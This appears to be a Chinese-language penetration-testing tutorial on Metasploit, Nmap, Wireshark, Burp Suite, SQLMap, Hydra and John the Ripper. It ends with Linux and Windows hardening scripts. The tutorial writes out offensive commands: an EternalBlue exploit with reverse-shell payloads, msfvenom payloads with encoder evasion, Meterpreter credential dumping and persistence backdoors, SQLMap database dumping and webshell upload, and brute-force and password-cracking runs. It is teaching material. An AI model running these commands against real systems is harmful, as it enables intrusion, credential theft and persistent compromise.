---
order: 4
title: 安全工具与实战
module: cybersecurity
category: 网络安全
difficulty: intermediate
description: 'Metasploit框架、Nmap高级用法、Wireshark深度分析、Burp Suite进阶、SQLMap自动化注入、Hydra暴力破解、John密码破解、Kali工具集、安全加固脚本。'
author: fanquanpp
updated: '2026-06-14'
related:
  - cybersecurity/Web安全与渗透测试
  - cybersecurity/二进制安全与应急响应
  - cybersecurity/XSS攻击
  - cybersecurity/安全模型与框架
prerequisites: []
---

## 1. Metasploit 框架

### 1.1 架构概述

```
Metasploit Framework
├── msfconsole    # 交互式控制台（最常用）
├── msfvenom      # Payload 生成器
├── msfdb         # 数据库管理
├── Modules       # 功能模块
│   ├── Exploits  # 漏洞利用
│   ├── Payloads  # 攻击载荷
│   ├── Auxiliaries # 辅助模块
│   ├── Encoders  # 编码器
│   ├── Nops      # 空指令
│   └── Post      # 后渗透模块
└── Database      # PostgreSQL 存储结果
```

### 1.2 基本使用流程

```bash
# 启动 Metasploit
msfconsole

# 搜索漏洞利用模块
search type:exploit platform:windows smb
search cve:2017-0144          # EternalBlue

# 选择模块
use exploit/windows/smb/ms17_010_eternalblue

# 查看模块信息和选项
show info
show options
show payloads

# 配置参数
set RHOSTS 192.168.1.100      # 目标 IP
set RPORT 445                 # 目标端口
set LHOST 192.168.1.50        # 本机 IP（回连地址）
set LPORT 4444                # 回连端口
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 执行攻击
exploit
# 或
run
```

### 1.3 Meterpreter 后渗透

```bash
# 系统信息
sysinfo                      # 系统信息
getuid                       # 当前用户
getsystem                    # 提权到 SYSTEM

# 文件操作
pwd / cd / ls                # 目录操作
download C:\\Users\\doc.txt  # 下载文件
upload /tmp/tool.exe C:\\    # 上传文件
cat C:\\Windows\\System32\\config\\SAM  # 读取文件

# 网络操作
ipconfig / ifconfig          # 网络信息
route                        # 路由表
portfwd add -l 8080 -p 80 -r 10.1.1.1  # 端口转发

# 权限维持
run persistence -U -i 30 -p 4444 -r 192.168.1.50  # 持久化后门

# 哈希获取
hashdump                     # 导出密码哈希
load kiwi                    # 加载 Mimikatz
creds_all                    # 获取明文密码

# 会话管理
background                   # 放入后台
sessions -l                  # 列出会话
sessions -i 1                # 切换到会话1
```

### 1.4 msfvenom 生成 Payload

```bash
# 生成 Windows 反向 TCP Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o shell.exe

# 生成 Linux Payload
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o shell.elf

# 生成 Python Payload
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.py

# 生成 PHP Payload
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php

# 编码绕过（多编码器叠加）
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o encoded_shell.exe
```

## 2. Nmap 高级用法

### 2.1 脚本引擎（NSE）

```bash
# 漏洞扫描脚本
nmap --script vuln 192.168.1.1

# SMB 漏洞检测
nmap --script smb-vuln* -p 445 192.168.1.1

# HTTP 枚举
nmap --script http-enum -p 80,443 192.168.1.1

# SSL/TLS 检测
nmap --script ssl-enum-ciphers -p 443 192.168.1.1

# DNS 区域传送
nmap --script dns-zone-transfer -p 53 ns1.example.com

# MySQL 空密码检测
nmap --script mysql-empty-password -p 3306 192.168.1.1

# 自定义脚本
nmap --script my-custom-script.nse 192.168.1.1
```

### 2.2 防火墙绕过

```bash
# 分片扫描
nmap -f 192.168.1.1

# 诱饵扫描
nmap -D RND:10 192.168.1.1     # 随机 10 个诱饵 IP
nmap -D decoy1,decoy2,ME 192.168.1.1

# 空闲扫描（Zombie Scan）
nmap -sI zombie_host 192.168.1.1

# 源端口欺骗
nmap --source-port 53 192.168.1.1   # 伪装 DNS 源端口

# 随机化扫描顺序
nmap --randomize-hosts 192.168.1.0/24

# 降低扫描速率
nmap -T0 --max-retries 1 192.168.1.1
```

## 3. Wireshark 深度分析

### 3.1 高级过滤

```
# 组合过滤
ip.src == 192.168.1.1 && tcp.flags.syn == 1 && tcp.flags.ack == 0
# 仅显示来自 192.168.1.1 的 SYN 包

# 搜索数据内容
tcp contains "password"
http contains "admin"
usb.src contains "00:1a"

# 基于长度的异常检测
frame.len > 1500                    # 超大帧
tcp.len == 0 && tcp.flags.syn == 0  # 纯 ACK 风暴

# DNS 隧道检测
dns.qry.name.len > 30               # 异常长的域名查询
dns.qry.name matches "[a-z0-9]{20,}"  # 随机子域名
```

### 3.2 协议分析技巧

```
HTTP 分析:
1. 过滤: http.request
2. 统计 → HTTP → 请求 → 查看请求分布
3. 右键 → 跟随 → HTTP 流 → 查看完整会话

TLS 分析:
1. 过滤: tls.handshake.type == 1  (ClientHello)
2. 查看支持的密码套件
3. 检查证书链和有效期

DNS 分析:
1. 过滤: dns.qry.name
2. 统计 → DNS → 查询类型分布
3. 检测 DNS 隧道: 异常 TXT 记录、超长子域名
```

### 3.3 tshark 命令行分析

```bash
# 基本抓包
tshark -i eth0 -w capture.pcap

# 读取并过滤
tshark -r capture.pcap -Y "http.request" \
  -T fields -e ip.src -e http.request.method -e http.host

# 统计 HTTP 状态码
tshark -r capture.pcap -Y "http.response" \
  -T fields -e http.response.code | sort | uniq -c | sort -rn

# 提取 DNS 查询
tshark -r capture.pcap -Y "dns.qry.name" \
  -T fields -e dns.qry.name | sort -u

# 导出 HTTP 对象
tshark -r capture.pcap --export-objects http,output_dir/

# TCP 流重组
tshark -r capture.pcap -z "follow,tcp,ascii,0"
```

## 4. Burp Suite 进阶

### 4.1 自动化扫描配置

```
1. 项目选项 → 连接 → 设置上游代理
2. 扫描器 → 配置扫描范围和排除项
3. 扫描器 → 活动扫描 → 选择审计项:
   - SQL 注入
   - XSS
   - 路径遍历
   - SSRF
   - 命令注入
4. 设置扫描速度: 节流避免触发 WAF
```

### 4.2 自定义插件（BApp Store）

| 插件            | 功能                 |
| :-------------- | :------------------- |
| Logger++        | 增强日志记录和搜索   |
| Autorize        | 自动化权限测试       |
| JSON Beautifier | JSON 格式化          |
| Hackvertor      | 编码/解码/加密标签   |
| Turbo Intruder  | 高性能 Intruder 替代 |
| Param Miner     | 自动发现隐藏参数     |

### 4.3 宏与会话管理

```
1. 项目选项 → 会话 → 添加宏
2. 录制登录流程: 访问登录页 → 提交凭证 → 获取会话
3. 设置宏触发条件: 检测到 302/401 时自动执行
4. 扫描器使用宏维持会话有效性
```

## 5. SQLMap 自动化注入

### 5.1 基本用法

```bash
# 检测 GET 参数注入
sqlmap -u "http://target.com/page?id=1" --batch

# 检测 POST 参数注入
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" --batch

# 使用 Cookie 认证
sqlmap -u "http://target.com/page?id=1" \
  --cookie="session=abc123"

# 从 Burp 请求文件导入
sqlmap -r request.txt --batch

# 指定参数注入
sqlmap -u "http://target.com/page?id=1&cat=2" -p id
```

### 5.2 数据提取

```bash
# 枚举数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 枚举表
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# 枚举列
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns

# 提取数据
sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C username,password --dump

# 提取所有数据
sqlmap -u "http://target.com/page?id=1" -D dbname --dump-all
```

### 5.3 高级技巧

```bash
# 绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

# 指定注入技术
sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline

# OS Shell（条件苛刻）
sqlmap -u "http://target.com/page?id=1" --os-shell

# 读取文件（MySQL FILE 权限）
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# 写入 WebShell
sqlmap -u "http://target.com/page?id=1" \
  --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

## 6. Hydra 暴力破解

### 6.1 在线服务爆破

```bash
# SSH 爆破
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.1.1 -t 4 -W 3

# FTP 爆破
hydra -l admin -P passwords.txt ftp://192.168.1.1

# HTTP POST 表单爆破
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:Login failed"

# MySQL 爆破
hydra -l root -P passwords.txt mysql://192.168.1.1

# RDP 爆破
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# 多协议批量爆破
hydra -L users.txt -P passwords.txt -M targets.txt ssh
```

### 6.2 参数优化

```bash
# 线程数（注意目标限速）
-t 16              # 16 并发线程

# 连接超时
-W 3               # 等待 3 秒

# 端口指定
-s 2222            # 非标准端口

# 退出条件
-f                 # 找到一个有效密码即停止
-e nsr             # n=null密码, s=same as login, r=reverse login

# 使用代理
-o results.txt     # 输出结果到文件
```

## 7. John the Ripper 密码破解

### 7.1 基本用法

```bash
# 破解 Linux 密码
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt

# 查看破解结果
john --show combined.txt

# 破解 Windows SAM
samdump2 SYSTEM SAM > hashes.txt
john --format=NT hashes.txt

# 破解 ZIP 密码
zip2john protected.zip > zip_hash.txt
john zip_hash.txt

# 破解 RAR 密码
rar2john protected.rar > rar_hash.txt
john rar_hash.txt

# 破解 SSH 密钥
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt
```

### 7.2 模式与规则

```bash
# 字典模式
john --wordlist=dict.txt hash.txt

# 规则模式（基于字典变体）
john --wordlist=dict.txt --rules hash.txt
# 自动应用: 大小写变换、数字追加、l33t 替换等

# 增量模式（暴力破解）
john --incremental hash.txt
john --incremental=Lower hash.txt       # 仅小写
john --incremental=Digits hash.txt      # 仅数字

# 自定义规则（john.conf）
[List.Rules:Custom]
$[0-9]$[0-9]     # 追加两位数字
^[_!@#]          # 前缀特殊字符
c                 # 首字母大写

john --wordlist=dict.txt --rules=Custom hash.txt
```

## 8. Kali Linux 工具集

### 8.1 常用工具分类

| 分类     | 工具                         | 用途             |
| :------- | :--------------------------- | :--------------- |
| 信息收集 | Nmap、Maltego、Recon-ng      | 侦察与枚举       |
| 漏洞分析 | Nikto、OpenVAS、Nessus       | 漏洞扫描         |
| Web 攻击 | SQLMap、Burp Suite、WPScan   | Web 渗透         |
| 密码攻击 | Hydra、John、Hashcat         | 密码破解         |
| 无线攻击 | Aircrack-ng、Wifite          | WiFi 渗透        |
| 社会工程 | SET、Phishing Frenzy         | 钓鱼攻击         |
| 后渗透   | Metasploit、Empire、Covenant | 持久化与横向移动 |
| 取证     | Volatility、Autopsy          | 数字取证         |

### 8.2 Kali 基础配置

```bash
# 更新系统
apt update && apt full-upgrade -y

# 安装常用工具
apt install -y nmap sqlmap hydra john nikto dirb gobuster

# 配置代理（如需）
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080

# 网络配置
ip addr show
ip route show

# 服务管理
systemctl start postgresql     # Metasploit 数据库
systemctl start apache2        # Web 服务
```

## 9. 安全加固脚本编写

### 9.1 Linux 一键加固脚本

```bash
#!/bin/bash
# Linux 安全加固脚本
# 仅用于授权环境

echo "[1/8] 配置账户策略..."
# 密码复杂度
apt install -y libpam-pwquality
cat > /etc/security/pwquality.conf << 'EOF'
minlen = 12
minclass = 3
dcredit = -1
ucredit = -1
lcredit = -1
ocredit = -1
EOF

# 密码过期
chage -M 90 -m 7 -W 14 root

echo "[2/8] 配置 SSH 安全..."
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
cat > /etc/ssh/sshd_config.d/hardening.conf << 'EOF'
Port 2222
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30
ClientAliveInterval 300
ClientAliveCountMax 2
AllowUsers admin
EOF

echo "[3/8] 配置防火墙..."
ufw default deny incoming
ufw default allow outgoing
ufw allow 2222/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw --force enable

echo "[4/8] 禁用危险服务..."
systemctl disable --now telnet.socket 2>/dev/null
systemctl disable --now rsh.socket 2>/dev/null
systemctl disable --now avahi-daemon 2>/dev/null
systemctl disable --now cups 2>/dev/null

echo "[5/8] 配置内核安全参数..."
cat >> /etc/sysctl.conf << 'EOF'
net.ipv4.tcp_syncookies = 1
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.icmp_echo_ignore_broadcasts = 1
kernel.exec-shield = 1
fs.suid_dumpable = 0
EOF
sysctl -p

echo "[6/8] 配置审计..."
apt install -y auditd
cat > /etc/audit/rules.d/hardening.rules << 'EOF'
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/ssh/sshd_config -p wa -k sshd
-a always,exit -F arch=b64 -S chmod,chown -F auid>=1000 -k perm_mod
-a always,exit -F arch=b64 -S execve -F auid>=1000 -k exec
EOF
augenrules --load

echo "[7/8] 配置日志..."
sed -i 's/^#SystemMaxUse=/SystemMaxUse=500M/' /etc/systemd/journald.conf
systemctl restart systemd-journald

echo "[8/8] 文件权限加固..."
chmod 700 /root
chmod 600 /etc/shadow
chmod 644 /etc/passwd

echo "安全加固完成！请检查并重启系统。"
```

### 9.2 Windows 安全加固脚本

```powershell
# Windows 安全加固脚本
# 需要管理员权限运行

Write-Host "[1/6] 配置账户策略..."
net accounts /maxpwage:90 /minpwage:1 /minpwlen:12 /uniquepw:5
net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30

Write-Host "[2/6] 配置防火墙..."
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
# 禁用规则
Disable-NetFirewallRule -DisplayGroup "远程卷管理"
Disable-NetFirewallRule -DisplayGroup "远程事件日志管理"

Write-Host "[3/6] 禁用危险服务..."
@("Telnet","RemoteRegistry","SNMP","WinRM") | ForEach-Object {
    Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
    Stop-Service -Name $_ -Force -ErrorAction SilentlyContinue
}

Write-Host "[4/6] 配置审计策略..."
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Object Access" /success:enable /failure:enable
auditpol /set /subcategory:"Privilege Use" /success:enable /failure:enable
auditpol /set /subcategory:"Account Management" /success:enable /failure:enable

Write-Host "[5/6] 安全配置..."
# 禁用 SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
# 禁用 LLMNR
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" `
  -Name "EnableMulticast" -Value 0 -PropertyType DWord -Force
# 禁用 AutoRun
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" `
  -Name "NoDriveTypeAutoRun" -Value 255 -PropertyType DWord -Force

Write-Host "[6/6] Windows Defender..."
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -MAPSReporting 2
Set-MpPreference -SubmitSamplesConsent 3
Update-MpSignature

Write-Host "安全加固完成！"
```
